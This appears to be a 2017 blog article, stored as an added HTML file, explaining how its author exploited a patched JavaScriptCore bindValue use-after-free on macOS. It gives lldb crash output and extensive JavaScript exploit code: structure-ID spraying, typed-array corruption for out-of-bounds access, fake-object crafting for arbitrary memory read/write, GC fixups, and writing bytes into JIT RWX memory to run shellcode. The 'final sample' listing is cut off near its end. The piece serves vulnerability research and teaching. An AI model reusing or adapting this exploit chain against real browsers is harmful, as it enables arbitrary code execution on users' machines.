@@ -1,0 +1,985 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0">
+		<link rel="stylesheet" type="text/css" href="css/core.css" />
+		<link rel="stylesheet" type="text/css" href="css/prism.css" />
+		<title>Exploiting JSC bindValue UaF</title>
+	</head>
+	
+	<body>
+		<script src="js/prism.js" type="text/javascript"></script>
+		
+		<div class="page">
+			<div class="container">
+				<div class="header">
+					<a href="/contact.html" class="header-element">
+						Contact
+					</a>
+					
+					<a href="/about.html" class="header-element">
+						About
+					</a>
+					
+					<a href="/articles.html" class="header-element">
+						Articles
+					</a>
+					
+					<a href="/index.html" class="header-element">
+						Home
+					</a>
+				</div>
+
+<h1>Exploiting JSC <code>bindValue</code> UaF</h1>
+<span class="date">Written: March, 2017</span>
+<hr>
+
+<h2>Introduction</h2>
+<p>
+	I decided to write an exploit for the <a href="https://trac.webkit.org/changeset/213742">JSC bindValue UaF</a>, patched on March 10th, 2017, as my first browser exploit. In this article I will describe how I exploited this bug through a mostly heuristic approach, without delving deeply into the WebKit source code.
+</p>
+
+<p>
+	My understanding of JSC internals comes almost entirely from <a href="https://twitter.com/5aelo">saelo</a>'s phrack paper, <a href="http://www.phrack.org/papers/attacking_javascript_engines.html">Attacking JavaScript Engines: A case study of JavaScriptCore and CVE-2016-4622</a> first, which I highly recommend reading for more detail.
+</p>
+
+<p>
+	Throughout this research I have used the version of JSC that is included with macOS Sierra 10.12.3.
+</p>
+
+<br>
+
+<h2>The bug</h2>
+<p>
+	As the <a href="https://trac.webkit.org/changeset/213742">changeset</a> mentions, a built-in method, <code>BindingNode::bindValue</code>, doesn't increase the scope's reference count, leading to a use after free vulnerability.
+</p>
+
+<p>
+	The changeset also comes with a regression test, which shows how to trigger the bug:
+</p>
+
+<p>
+	<a href="https://trac.webkit.org/browser/trunk/JSTests/stress/regress-168546.js?rev=213742">trunk/JSTests/stress/regress-168546.js</a>:
+</p>
+
+<pre><code class="language-c">// This test passes if it does not crash.
+try {
+	(function () {
+		let a = {
+			get val() {
+				[...{a = 1.45}] = [];
+				a.val.x;
+			},
+		};
+		
+		a.val;
+	})();
+} catch (e) {
+}</code></pre>
+
+<br>
+
+<p>
+	This code on its own won't actually crash, we need to allocate an object to achieve a crash:
+</p>
+
+<pre><code class="language-c">function bug() {
+	let a = {
+		get val() {
+			[...{a = 1.45}] = [];
+			a.val = 1337;
+		},
+	};
+	a.val; 
+};
+
+var k = new Uint32Array(0);
+
+bug();
+
+print(k);</code></pre>
+
+<br>
+
+<h2>Analysing the crash</h2>
+<p>
+	Since System Integrity Protection will prevent us from attaching a debugger to a system binary, we will first need to copy <code>/System/Library/Frameworks/JavaScriptCore.framework/Resources/jsc</code> to a local directory.
+</p>
+
+<p>
+	The process can then be started with the following commands:
+</p>
+
+<pre><code>lldb jsc bindValue/poc.js
+(lldb) process launch</code></pre>
+
+<br>
+
+<p>
+	The output from lldb is:
+</p>
+
+<pre><code>Process 17493 stopped
+* thread #1: tid = 0x73b48, 0x00007fff90c2b98a JavaScriptCore`JSC::JSObject::get(JSC::ExecState*, JSC::PropertyName) const + 1450, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x299f91998)
+	frame #0: 0x00007fff90c2b98a JavaScriptCore`JSC::JSObject::get(JSC::ExecState*, JSC::PropertyName) const + 1450
+JavaScriptCore`JSC::JSObject::get:
+->  0x7fff90c2b98a <+1450>: movq   (%rcx,%rax,8), %r13
+    0x7fff90c2b98e <+1454>: testb  $0x8, 0x6(%r14)
+    0x7fff90c2b993 <+1459>: jne	0x7fff90c2b91f			; <+1343>
+    0x7fff90c2b995 <+1461>: movq   0x50(%r13), %rbx
+</code></pre>
+
+<br>
+
+<p>
+	The interesting register values are <code>rax</code>, which holds a corrupted value, and <code>rdi</code> which is a pointer to <code>k</code>:
+</p>
+
+<pre><code>(lldb) register read rax
+0x0000000033333333
+(lldb) register read rdi
+0x00000001025e7d80</code></pre>
+
+<br>
+
+<p>
+	Without going into too much detail, the <code>bug</code> function triggered a use after free, which then caused a heap overflow, and ultimately resulted in corrupting the <code>JSCell</code> value of the previous object on the marked space heap. In our case, the <code>k</code> object's <code>JSCell</code> was corrupted, which resulted in a crash when JSC tried to <code>get</code> the object in order to execute <code>print(k)</code>.
+</p>
+
+<br>
+
+<h2><code>JSCell</code> corruption</h2>
+<p>
+	Every object in marked space starts with an 8-byte <a href="https://github.com/WebKit/webkit/blob/473448d50d61ed5f644979663340ec562bfa30cb/Source/JavaScriptCore/runtime/JSCell.h#L263"><code>JSCell</code></a> value, which is constructed of the following:
+</p>
+
+
+<ul>
+	<li><code>StructureID m_structureID</code> (4 bytes)</li>
+	<li><code>IndexingType m_indexingTypeAndMisc</code> (1 byte)</li>
+	<li><code>JSType m_type</code> (1 byte)</li>
+	<li><code>TypeInfo::InlineTypeFlags m_flags</code> (1 byte)</li>
+	<li><code>CellState m_cellState</code> (1 byte)</li>
+</ul>
+
+<p>
+	All of these are explained in section 5.2 of <a href="http://www.phrack.org/papers/attacking_javascript_engines.html">saelo's phrack paper</a>.
+</p>
+
+<p>
+	With the ability to corrupt an object's <code>JSCell</code> there are a few different routes for exploitation such as: manipulating <code>m_cellState</code> to cause the garbage collector to trigger UaF, type confusion, or heap overflow. I chose to go with heap overflow.
+</p>
+
+<br>
+
+<h2>Heap overflow</h2>
+<p>
+	Using the primitive to change an object's <code>structureID</code>, we can convert a <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Typed_arrays">typed array</a> into one with differently sized elements. The idea being that the <code>length</code> property will not be correct for an array of differently sized elements, and will allow out of bound access after the conversion.
+</p>
+
+<p>
+	For example, if we create a <code>Uint8Array</code> of <code>0x400</code> elements, <code>0x400</code> bytes will be allocated for the internal buffer of this object. If it is then corrupted into a <code>Uint32Array</code>, its size has effectively become <code>0x400 * 4 = 0x1000</code> bytes, allowing us to access <code>0x1000 - 0x400 = 0xC00</code> bytes of out of bounds memory.
+</p>
+
+<p>
+	When creating an object, we don't know exactly what its <code>structureID</code> will be, so we will spray the structure table with <code>0x800</code> entires of <code>Uint32Array</code>s first to ensure that we will corrupt the <code>structureID</code> to one of these.
+</p>
+
+<pre><code class="language-c">function makeid() {
+	var text = &quot;&quot;;
+	var possible = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;;
+	
+	for(var i = 0; i &lt; 8; i++)
+		text += possible.charAt(Math.floor(Math.random() * possible.length));
+	
+	return text;
+};
+
+function sprayUint32Arrays(count) {
+	for(var i = 0; i &lt; count; i++) {
+		var a = new Uint32Array(1);
+		a[makeid()] = 1337;
+	}
+}
+
+function JSCellHigh(m_indexingType, m_type, m_flags, m_cellState) {
+	return m_indexingType | m_type &lt;&lt; 8 | m_flags &lt;&lt; 16 | m_cellState &lt;&lt; 24;
+}
+
+function intToFloat(high, low) {
+	var view = new DataView(new ArrayBuffer(16));
+	view.setUint32(0, high);
+	view.setUint32(4, low);
+	return view.getFloat64(0);
+}
+
+function toHex(i, j) {
+	if(typeof j === &quot;undefined&quot;) j = 4;
+	return (i + 0x100000000).toString(16).substr(-j * 2).toUpperCase();
+}
+
+function hexDump(array, length, start) {
+	var s = 0;
+	
+	if(typeof start === &quot;undefined&quot;) start = 0;
+	
+	if(array instanceof Uint8Array) s = 1;
+	else if(array instanceof Uint32Array) s = 4;
+	else return;
+	
+	for(var i = start; i &lt; length;) {
+		var t = &quot;&quot;;
+		
+		for(var j = 0; j &lt; 0x10 / s &amp;&amp; i &lt; length; j++) {
+			t += toHex(array[i++], s) + &quot; &quot;;
+		}
+		
+		print(t);
+	}
+}
+
+function corruptLastObject(JSCellHigh, structureID) {
+	let a = {
+		get val() {
+			[...{a = intToFloat(JSCellHigh, structureID)}] = [];
+			a.val = 1337;
+		},
+	};
+	a.val; 
+};
+
+function makeCorruptedObject(JSCellHigh, structureID) {
+	var k = new Uint8Array(0x400);
+	
+	for(var i = 0; i &lt; k.length; i++) {
+		k[i] = 0xc2;
+	}
+	
+	corruptLastObject(JSCellHigh, structureID);
+	
+	if(!(k instanceof Uint32Array)) {
+		return null;
+	}
+	
+	return k;
+}
+
+function go() {
+	print(&quot;  [+] Spraying stuctureID table with Uint32Arrays&quot;);
+	
+	sprayUint32Arrays(0x800);
+	
+	print(&quot;  [+] Getting corrupted Uint32Array&quot;);
+	
+	// Get a Uint32Array with corrupted length by corrupting a Uint8Array into a Uint32Array
+	var k = makeCorruptedObject(JSCellHigh(0x00, 0x23, 0x60, 0x01), 0x800);
+	
+	if(!k) {
+		print("  [-] Failed to corrupt Uint8Array!");
+		return;
+	}
+	
+	print(&quot;  [+] Changed k's structureID from Uint8Array entry to Uint32Array entry&quot;);
+	
+	print(Object.prototype.toString.call(k));
+	print(Object.prototype.toString.call(k[0]));
+	
+	print(&quot;  [+] Reading past buffer bounds&quot;);
+	
+	hexDump(k, k.length, k.length / 4);
+}
+
+go();
+</code></pre>
+
+<br>
+
+<h2>Copied space heap corruption</h2>
+<p>
+	Typed arrays store their contents in the copied space, which is where our heap overflow through the corrupted <code>Uint32Array</code> occurs.
+</p>
+
+<p>
+	Our aim at this point is to spray copied space with an <code>Array</code> of objects so that the <code>Uint32Array</code> has a buffer which overlaps with other objects. We will then able to access the raw bytes of an object through the corrupted <code>Uint32Array</code>, and use this to craft fake objects.
+</p>
+
+<p>
+	Specifically, we will spray <code>JSArray</code>s of a certain <code>JSValue</code> (<code>0x41414141</code>), and then search our corrupted <code>Uint32Array</code> for this <code>JSValue</code>. Once we have found it, we can modify it to a different <code>JSValue</code> (<code>0x42424242</code>), and locate the object in the <code>Array</code> whose value has changed.
+</p>
+
+<pre><code class="language-c">...
+
+function go() {
+	var bufs = new Array(0x1000);
+	
+	print(&quot;  [+] Spraying stuctureID table with Uint32Arrays&quot;);
+	
+	sprayUint32Arrays(0x800);
+	
+	print(&quot;  [+] Getting corrupted Uint32Array&quot;);
+	
+	// Get a Uint32Array with corrupted length by corrupting a Uint8Array into a Uint32Array
+	var k = makeCorruptedObject(JSCellHigh(0x00, 0x23, 0x60, 0x01), 0x800);
+	
+	if(!k) {
+		print(&quot;  [-] Failed to corrupt Uint8Array!&quot;);
+		return;
+	}
+	
+	print(&quot;  [+] Spraying arrays of integers of 0x41414141&quot;);
+	
+	for(var i = 0; i &lt; bufs.length; i++) {
+		bufs[i] = new Array(0x100)
+		for(var j = 0; j &lt; bufs[i].length;) {
+			// Integer 0x41414141 is represented as JSValue 0xffff000041414141
+			bufs[i][j++] = 0x41414141;
+		}
+	}
+	
+	print(&quot;  [+] Searching overflow of corrupted Uint32Array for 0x41414141 spray&quot;);
+	
+	var found = 0;
+	
+	for(var i = k.length / 4; i &lt; k.length;) {
+		if(k[i++] == 0x41414141 &amp;&amp; k[i++] == 0xffff0000) {
+			found = i - 2;
+			break;
+		}
+	}
+	
+	if(!found) {
+		printf(&quot;  [-] Couldn't find 0x41414141 spray&quot;);
+		return;
+	}
+	
+	print(&quot;  [+] Modifying the found element of the 0x41414141 spray&quot;);
+	
+	// We can now craft arbitrary objects
+	k[found] = 0x42424242;
+	k[found + 1] = 0xffff0000;
+	
+	print(&quot;  [+] Searching for modified element&quot;);
+	
+	var cx = null;
+	var cy = null;
+	
+	// Find the crafted object
+	for(var i = 0; i &lt; bufs.length &amp;&amp; cx == null; i++) {
+		for(var j = 0; j &lt; bufs[i].length;) {
+			if(bufs[i][j++] == 0x42424242) {
+				cx = i;
+				cy = j - 1;
+				break;
+			}
+		}
+	}
+	
+	if(cx == null) {
+		print(&quot;  [-] Couldn't find the modified element&quot;);
+		return;
+	}
+	
+	
+	// The raw bytes of the `bufs[cx][cy]` object can now be accessed through `k` from index `found`
+}
+
+go();
+</code></pre>
+
+<br>
+
+<h2>Crafting fake array to gain arbitrary RW</h2>
+<p>
+	Given that we can craft arbitrary objects, all we need to do at this point to gain arbitrary RW is craft a <code>Uint32Array</code> (<code>bufs[cx][cy]</code>) with a <code>vector</code> property which points to a <code>Uint8Array</code> (<code>v</code>). The <code>Uint32Array</code> would then be able to overwrite the <code>vector</code> and <code>length</code> properties of the <code>Uint8Array</code>, achieving arbitrary RW.
+</p>
+
+<p>
+	Crafting the fake <code>Uint32Array</code> is done by creating a new object (a container), whose inline storage contains the raw bytes of our crafted object (a <code>Uint32Array</code>), and setting the element we located in the <code>Array</code> to point to this new object.
+</p>
+
+<pre><code class="language-c">var v = new Uint8Array(0x1000);
+
+// structureID, butterfly, vector, length and flags
+bufs[cx][cy] = { a:intToFloat(JSCellHigh(0x00, 0x23, 0x60, 0x01), 0x800), b:null, c:v, d:intToFloat(0, 8) };</code></pre>
+
+<br>
+
+<p>
+	We then use the corrupted <code>Uint32Array</code> (<code>k</code>) to advance this pointer, so that it points to the container object's inline storage instead, turning it into the fake <code>Uint32Array</code> that we crafted above.
+</p>
+
+<pre><code class="language-c">// 48 bytes of a JSValue address used for pointer
+var fakeObjectContainerAddress = [k[found + 1] &amp; 0xffff, k[found]];
+
+k[found] += 0x10;
+
+var fakeObjectAddress = [k[found + 1] &amp; 0xffff, k[found]];</code></pre>
+
+<br>
+
+<p>
+	Now, the <code>vector</code> and <code>length</code> of the <code>v</code> array can be set through the crafted <code>Uint32Array</code> (at <code>bufs[cx][cy]</code>).
+</p>
+
+<pre><code class="language-c">bufs[cx][cy][6] = 0xffffffff;
+print(&quot;  [+] Set v.length to 0x&quot; + toHex(v.length));</code></pre>
+
+<br>
+
+<p>
+	Finally, we can expose some nice wrappers for the arbitrary RW primitive.
+</p>
+
+<pre><code class="language-c">...
+
+function go() {
+	
+	...
+	
+	memory = {
+		read: function(addr, length) {
+			var high = addr[0];
+			var low = addr[1];
+			
+			bufs[cx][cy][4] = low;
+			bufs[cx][cy][5] = high &amp; 0xffff;
+			
+			var a = new Uint8Array(length);
+			for(var i = 0; i &lt; length; i++) a[i] = v[i];
+			return a;
+		},
+		
+		write: function(addr, data) {
+			var high = addr[0];
+			var low = addr[1];
+			
+			bufs[cx][cy][4] = low;
+			bufs[cx][cy][5] = high &amp; 0xffff;
+			
+			for(var i = 0; i &lt; data.length; i++) v[i] = data[i];
+		},
+		
+		read32: function(addr) {
+			var val = this.read(addr, 4);
+			return val[0] &lt;&lt; 0 | val[1] &lt;&lt; 8 | val[2] &lt;&lt; 16 | val[3] &lt;&lt; 24;
+		},
+		
+		write32: function(addr, val) {
+			var array = [ (val &gt;&gt; 0) &amp; 0xff, (val &gt;&gt; 8) &amp; 0xff, (val &gt;&gt; 16) &amp; 0xff, (val &gt;&gt; 24) &amp; 0xff ];
+			this.write(addr, array);
+		},
+		
+		// Treat 64bit values as an array of [high, low]
+		read64a: function(addr) {
+			var val = this.read(addr, 8);
+			return [ val[4] &lt;&lt; 0 | val[5] &lt;&lt; 8 | val[6] &lt;&lt; 16 | val[7] &lt;&lt; 24, val[0] &lt;&lt; 0 | val[1] &lt;&lt; 8 | val[2] &lt;&lt; 16 | val[3] &lt;&lt; 24 ];
+		},
+		
+		write64a: function(addr, val) {
+			var array = [ (val[1] &gt;&gt; 0) &amp; 0xff, (val[1] &gt;&gt; 8) &amp; 0xff, (val[1] &gt;&gt; 16) &amp; 0xff, (val[1] &gt;&gt; 24) &amp; 0xff, (val[0] &gt;&gt; 0) &amp; 0xff, (val[0] &gt;&gt; 8) &amp; 0xff, (val[0] &gt;&gt; 16) &amp; 0xff, (val[0] &gt;&gt; 24) &amp; 0xff ];
+			this.write(addr, array);
+		},
+	};
+	
+	print(&quot;  [+] Reading memory&quot;);
+	
+	var test = memory.read(fakeObjectAddress, 0x100);
+	hexDump(test, test.length);
+}
+
+go();
+</code></pre>
+
+<br>
+
+<h2>Cleanup</h2>
+<p>
+	Due to the way in which we constructed our fake <code>Uint32Array</code> (<code>bufs[cx][cy]</code>), there are certain properties which will cause garbage collection to crash.
+</p>
+
+<p>
+	To correct this and maintain a stable state, we will use the same technique as descibed by saelo:
+</p>
+
+<div class="quote">
+	<ul>
+		<li>
+			1. Create an empty object. The structure of this object will describe an object with the default amount of inline storage (6 slots), but none of them being used.
+		</li>
+		
+		<br>
+		
+		<li>
+			2. Copy the JSCell header (containing the structure ID) to the container object. We've now caused the engine to "forget" about the properties of the container object that make up our fake array.
+		</li>
+		
+		<br>
+		
+		<li>
+			3. Set the butterfly pointer of the fake array to nullptr, and, while we're at it also replace the JSCell of that object with one from a default Float64Array instance.
+		</li>
+	</ul>
+</div>
+
+<div class="quote-reference">
+	- <a href="http://www.phrack.org/papers/attacking_javascript_engines.html">section 6.4 of saelo's phrack paper</a>
+</div>
+<br>
+
+<br>
+
+<pre><code class="language-c">	// Fixup the JSCell header of the container to make it look like an empty object.
+	// By default, JSObjects have an inline capacity of 6, enough to hold the fake Uint32Array.
+	bufs[cx][cy + 1] = {};
+	var emptyAddr = [k[found + 1 * 2 + 1] &amp; 0xffff, k[found + 1 * 2]];
+	
+	var header = memory.read(emptyAddr, 8);
+	memory.write(fakeObjectContainerAddress, header);
+	
+	// Copy the JSCell and Butterfly (will be nullptr) from an existing Uint32Array.
+	bufs[cx][cy + 2] = new Uint32Array(8);
+	var u32arrayAddr = [k[found + 2 * 2 + 1] &amp; 0xffff, k[found + 2 * 2]];
+	header = memory.read(u32arrayAddr, 16);
+	memory.write(fakeObjectAddress, header);
+	
+	// Set valid flags as well: make it look like an OversizeTypedArray
+	// for easy GC survival (see JSGenericTypedArrayView&lt;Adaptor&gt;::visitChildren).
+	memory.write(add32a(fakeObjectAddress, 24), [0x10, 0, 0, 0, 1, 0, 0, 0]);</code></pre>
+
+<br>
+
+<p>
+	Now, when we trigger garbage collection, no crash will occur!
+</p>
+
+<pre><code class="language-c">var pressure = new Array(400);
+function garbage() {
+	for(var i = 0; i < pressure.length; i++) {
+		pressure[i] = new Uint32Array(0x100000);
+	}
+}
+
+garbage();</code></pre>
+
+<br>
+
+<h2>Executing payload</h2>
+<p>
+	This final stage may vary slightly depending on the target you are attempting to exploit since some WebKit browsers implement JIT slightly differently. For the rest of this article we will continue to focus on JSC on macOS, which simply implements JIT with RWX pages.
+</p>
+
+<p>
+	Essentially, we can create a function which performs some relatively intensive loops in order to force it to be dynamically recompiled via JIT. Then we can read a set of pointers starting from this function object to ultimately lead us to the address of the recompiled function's RWX memory. This memory can then be rewritten, and executed by calling the function.
+</p>
+
+<pre><code class="language-c">function makeJITCompiledFunction() {
+	var str = &quot;&quot;;
+	for(var i = 0; i &lt; 4096; i++) {
+		str += &quot;try{}catch(e){}; &quot;;
+	}
+	fcn = new Function(str);
+	for(var i = 0; i &lt; 0x4000; i++) {
+		fcn();
+	}
+	return fcn;
+}
+
+function go() {
+	...
+	
+	// Execute shellcode
+	bufs[cx][cy + 3] = makeJITCompiledFunction();
+	
+	var functionAddr = [k[found + 3 * 2 + 1] &amp; 0xffff, k[found + 3 * 2]];
+	print(&quot;  [+] Shellcode function object: 0x&quot; + toHex(functionAddr[0]) + toHex(functionAddr[1]));
+	
+	var executableAddr = memory.read64a(add32a(functionAddr, 24));
+	print(&quot;  [+] Executable instance: 0x&quot; + toHex(executableAddr[0]) + toHex(executableAddr[1]));
+	
+	var jitCodeAddr = memory.read64a(add32a(executableAddr, 24));
+	print(&quot;  [+] JITCode instance: 0x&quot; + toHex(jitCodeAddr[0]) + toHex(jitCodeAddr[1]));
+	
+	var codeAddr = memory.read64a(add32a(jitCodeAddr, 16));
+	print(&quot;  [+] RWX memory: 0x&quot; + toHex(codeAddr[0]) + toHex(codeAddr[1]));
+	
+	print(&quot;  [+] Writing shellcode...&quot;);
+	
+	/*
+		a:
+		jmp a
+		
+		memory.write(codeAddr, [0xeb, 0xfe]);
+	*/
+	
+	
+	/*
+		mov rax, 0xffff000013371337
+		ret
+	*/
+	
+	memory.write(codeAddr, [ 0x48, 0xB8, 0x37, 0x13, 0x37, 0x13, 0x00, 0x00, 0xFF, 0xFF, 0xC3 ]);
+	
+	
+	print(&quot;  [+] Jumping into shellcode...&quot;);
+	var r = bufs[cx][cy + 3]();
+	
+	print(&quot;  [+] Shellcode returned 0x&quot; + toHex(r));
+}
+
+go();
+</code></pre>
+
+<br>
+
+<p>
+	Other systems such as the <a href="http://cturt.github.io/ps4-3.html#code-execution">PS4</a> use a slightly more complicated system involving multiple virtual mappings with different permissions. On <a href="">iOS 10</a> the address of writable JIT regions is encoded as an immediate value in an instruction which is marked execute only, and so a short ROP chain is required to gain arbitrary code execution.
+</p>
+
+<br>
+
+<h2>Summary</h2>
+<p>
+	Here is the final sample, which exploits the bug to gain arbitrary RW, and then uses this to write and executes arbitrary shellcode.
+</p>
+
+<pre><code class="language-c">function makeJITCompiledFunction() {
+	var str = &quot;&quot;;
+	for(var i = 0; i &lt; 4096; i++) {
+		str += &quot;try{}catch(e){}; &quot;;
+	}
+	fcn = new Function(str);
+	for(var i = 0; i &lt; 0x4000; i++) {
+		fcn();
+	}
+	return fcn;
+}
+
+function makeid() {
+	var text = &quot;&quot;;
+	var possible = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;;
+	
+	for(var i = 0; i &lt; 8; i++)
+		text += possible.charAt(Math.floor(Math.random() * possible.length));
+	
+	return text;
+};
+
+function sprayUint32Arrays(count) {
+	for(var i = 0; i &lt; count; i++) {
+		var a = new Uint32Array(1);
+		a[makeid()] = 1337;
+	}
+}
+
+function JSCellHigh(m_indexingType, m_type, m_flags, m_cellState) {
+	return m_indexingType | m_type &lt;&lt; 8 | m_flags &lt;&lt; 16 | m_cellState &lt;&lt; 24;
+}
+
+function intToFloat(high, low) {
+	var view = new DataView(new ArrayBuffer(16));
+	view.setUint32(0, high);
+	view.setUint32(4, low);
+	return view.getFloat64(0);
+}
+
+function add32a(original, adding) {
+	var new_lo = (((original[1] &gt;&gt;&gt; 0) + adding) &amp; 0xFFFFFFFF) &gt;&gt;&gt; 0;
+	var new_hi = (original[0] &gt;&gt;&gt; 0);
+	if (new_lo &lt; original[1]) {
+		new_hi++;
+	}
+	return [new_hi, new_lo];
+}
+
+function sub32a(original, subbing) {
+	var new_lo = (((original[1] &gt;&gt;&gt; 0) - subbing) &amp; 0xFFFFFFFF) &gt;&gt;&gt; 0;
+	var new_hi = (original[0] &gt;&gt;&gt; 0);
+	if ((new_lo &gt; original[1]) &amp; 0xFFFFFFFF) {
+		new_hi--;
+	}
+	return [new_hi, new_lo];
+}
+
+function toHex(i, j) {
+	if(typeof j === &quot;undefined&quot;) j = 4;
+	return (i + 0x100000000).toString(16).substr(-j * 2).toUpperCase();
+}
+
+function hexDump(array, length, start) {
+	var s = 0;
+	
+	if(typeof start === &quot;undefined&quot;) start = 0;
+	
+	if(array instanceof Uint8Array) s = 1;
+	else if(array instanceof Uint32Array) s = 4;
+	else return;
+	
+	for(var i = start; i &lt; length;) {
+		var t = &quot;&quot;;
+		
+		for(var j = 0; j &lt; 0x10 / s &amp;&amp; i &lt; length; j++) {
+			t += toHex(array[i++], s) + &quot; &quot;;
+		}
+		
+		print(t);
+	}
+}
+
+function corruptLastObject(JSCellHigh, structureID) {
+	let a = {
+		get val() {
+			[...{a = intToFloat(JSCellHigh, structureID)}] = [];
+			a.val = 1337;
+		},
+	};
+	a.val; 
+};
+
+function makeCorruptedObject(JSCellHigh, structureID) {
+	var k = new Uint8Array(0x40 * 8);
+	
+	for(var i = 0; i &lt; k.length; i++) {
+		k[i] = 0xc2;
+	}
+	
+	corruptLastObject(JSCellHigh, structureID);
+	
+	if(!(k instanceof Uint32Array)) {
+		return null;
+	}
+	
+	return k;
+}
+
+function go() {
+	var bufs = new Array(0x1000);
+	
+	print(&quot;  [+] Spraying stuctureID table with Uint32Arrays&quot;);
+	
+	sprayUint32Arrays(0x800);
+	
+	print(&quot;  [+] Getting corrupted Uint32Array&quot;);
+	
+	// Get a Uint32Array with corrupted length by corrupting a Uint8Array into a Uint32Array
+	var k = makeCorruptedObject(0x1602300, 0x800);
+	
+	if(!k) {
+		print(&quot;  [-] Failed to corrupt Uint8Array!&quot;);
+		return;
+	}
+	
+	print(&quot;  [+] Spraying arrays of integers of 0x41414141&quot;);
+	
+	for(var i = 0; i &lt; bufs.length; i++) {
+		bufs[i] = new Array(0x100)
+		for(var j = 0; j &lt; bufs[i].length;) {
+			// Integer 0x41414141 is represented as JSValue 0xffff000041414141
+			bufs[i][j++] = 0x41414141;
+		}
+	}
+	
+	print(&quot;  [+] Searching overflow of corrupted Uint32Array for 0x41414141 spray&quot;);
+	
+	var found = 0;
+	
+	for(var i = k.length / 4; i &lt; k.length;) {
+		if(k[i++] == 0x41414141 &amp;&amp; k[i++] == 0xffff0000) {
+			found = i - 2;
+			break;
+		}
+	}
+	
+	if(!found) {
+		printf(&quot;  [-] Couldn't find 0x41414141 spray&quot;);
+		return;
+	}
+	
+	print(&quot;  [+] Modifying the found element of the 0x41414141 spray&quot;);
+	
+	// We can now craft arbitrary objects
+	k[found] = 0x42424242;
+	k[found + 1] = 0xffff0000;
+	
+	print(&quot;  [+] Searching for modified element&quot;);
+	
+	var cx = null;
+	var cy = null;
+	
+	// Find the crafted object
+	for(var i = 0; i &lt; bufs.length &amp;&amp; cx == null; i++) {
+		for(var j = 0; j &lt; bufs[i].length;) {
+			if(bufs[i][j++] == 0x42424242) {
+				cx = i;
+				cy = j - 1;
+				break;
+			}
+		}
+	}
+	
+	if(cx == null) {
+		print(&quot;  [-] Couldn't find the modified element&quot;);
+		return;
+	}
+	
+	print(&quot;  [+] Crafting fake object&quot;);
+	
+	var v = new Uint8Array(0x1000);
+	
+	// StructureID, butterfly, vector, length and flags
+	bufs[cx][cy] = { a:intToFloat(JSCellHigh(0x00, 0x23, 0x60, 0x01), 0x800), b:null, c:v, d:intToFloat(0, 8) };
+	
+	// 48 bytes of a JSValue address used for pointer
+	var fakeObjectContainerAddress = [k[found + 1] &amp; 0xffff, k[found]];
+	
+	k[found] += 0x10;
+	
+	var fakeObjectAddress = [k[found + 1] &amp; 0xffff, k[found]];
+	
+	print(&quot;  [+] Fake object crafted at 0x&quot; + toHex(fakeObjectAddress[0]) + toHex(fakeObjectAddress[1]));
+	
+	bufs[cx][cy][6] = 0xffffffff;
+	print(&quot;  [+] Set v.length to 0x&quot; + toHex(v.length));
+	
+	memory = {
+		read: function(addr, length) {
+			var high = addr[0];
+			var low = addr[1];
+			
+			bufs[cx][cy][4] = low;
+			bufs[cx][cy][5] = high &amp; 0xffff;
+			
+			var a = new Uint8Array(length);
+			for(var i = 0; i &lt; length; i++) a[i] = v[i];
+			return a;
+		},
+		
+		write: function(addr, data) {
+			var high = addr[0];
+			var low = addr[1];
+			
+			bufs[cx][cy][4] = low;
+			bufs[cx][cy][5] = high &amp; 0xffff;
+			
+			for(var i = 0; i &lt; data.length; i++) v[i] = data[i];
+		},
+		
+		read32: function(addr) {
+			var val = this.read(addr, 4);
+			return val[0] &lt;&lt; 0 | val[1] &lt;&lt; 8 | val[2] &lt;&lt; 16 | val[3] &lt;&lt; 24;
+		},
+		
+		write32: function(addr, val) {
+			var array = [ (val &gt;&gt; 0) &amp; 0xff, (val &gt;&gt; 8) &amp; 0xff, (val &gt;&gt; 16) &amp; 0xff, (val &gt;&gt; 24) &amp; 0xff ];
+			this.write(addr, array);
+		},
+		
+		// Treat 64bit values as an array of [high, low]
+		read64a: function(addr) {
+			var val = this.read(addr, 8);
+			return [ val[4] &lt;&lt; 0 | val[5] &lt;&lt; 8 | val[6] &lt;&lt; 16 | val[7] &lt;&lt; 24, val[0] &lt;&lt; 0 | val[1] &lt;&lt; 8 | val[2] &lt;&lt; 16 | val[3] &lt;&lt; 24 ];
+		},
+		
+		write64a: function(addr, val) {
+			var array = [ (val[1] &gt;&gt; 0) &amp; 0xff, (val[1] &gt;&gt; 8) &amp; 0xff, (val[1] &gt;&gt; 16) &amp; 0xff, (val[1] &gt;&gt; 24) &amp; 0xff, (val[0] &gt;&gt; 0) &amp; 0xff, (val[0] &gt;&gt; 8) &amp; 0xff, (val[0] &gt;&gt; 16) &amp; 0xff, (val[0] &gt;&gt; 24) &amp; 0xff ];
+			this.write(addr, array);
+		},
+	};
+	
+	// Fixup the JSCell header of the container to make it look like an empty object.
+	// By default, JSObjects have an inline capacity of 6, enough to hold the fake Uint32Array.
+	bufs[cx][cy + 1] = {};
+	var emptyAddr = [k[found + 1 * 2 + 1] &amp; 0xffff, k[found + 1 * 2]];
+	
+	var header = memory.read(emptyAddr, 8);
+	memory.write(fakeObjectContainerAddress, header);
+	
+	// Copy the JSCell and Butterfly (will be nullptr) from an existing Uint32Array.
+	bufs[cx][cy + 2] = new Uint32Array(8);
+	var u32arrayAddr = [k[found + 2 * 2 + 1] &amp; 0xffff, k[found + 2 * 2]];
+	header = memory.read(u32arrayAddr, 16);
+	memory.write(fakeObjectAddress, header);
+	
+	// Set valid flags as well: make it look like an OversizeTypedArray
+	// for easy GC survival (see JSGenericTypedArrayView&lt;Adaptor&gt;::visitChildren).
+	memory.write(add32a(fakeObjectAddress, 24), [0x10, 0, 0, 0, 1, 0, 0, 0]);
+	
+	// Run garbage collector to make sure it doesn't crash
+	/*
+	var pressure = new Array(400);
+	function garbage() {
+		for(var i = 0; i &lt; pressure.length; i++) {
+			pressure[i] = new Uint32Array(0x100000);
+		}
+	}
+	
+	garbage();
+	*/
+	
+	// Execute shellcode
+	bufs[cx][cy + 3] = makeJITCompiledFunction();
+	
+	var functionAddr = [k[found + 3 * 2 + 1] &amp; 0xffff, k[found + 3 * 2]];
